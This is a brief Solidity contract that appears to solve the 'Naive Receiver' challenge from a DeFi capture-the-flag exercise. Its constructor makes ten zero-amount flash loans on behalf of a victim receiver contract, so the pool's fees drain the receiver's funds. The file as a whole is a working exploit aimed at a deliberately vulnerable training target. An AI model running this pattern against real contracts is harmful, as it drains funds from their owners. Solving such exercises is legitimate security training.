// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";
import "../naive-receiver/FlashLoanReceiver.sol";

contract SolveNaiveReceiver {
    constructor(NaiveReceiverLenderPool instance, FlashLoanReceiver receiver) {
        for (uint256 i = 0; i < 10; i++)
            instance.flashLoan(receiver, instance.ETH(), 0, "");
    }
}
